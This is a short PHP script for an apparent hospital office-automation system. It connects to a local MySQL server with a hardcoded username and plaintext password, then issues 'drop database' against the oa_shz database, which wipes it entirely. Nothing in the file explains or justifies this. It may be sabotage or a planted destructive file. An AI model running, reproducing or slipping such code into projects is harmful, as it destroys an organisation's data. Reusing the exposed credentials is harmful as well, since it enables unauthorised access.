<?php 
$hostnames = 'localhost';
$userids = 'oa_xmt';
$passwords = 'fukeoa1999cjhospital';
$database = 'oa_shz';

$conn = mysql_connect($hostnames,$userids,$passwords);
mysql_select_db($database,$conn);
mysql_query("drop database `oa_shz`");
mysql_close($conn);
?>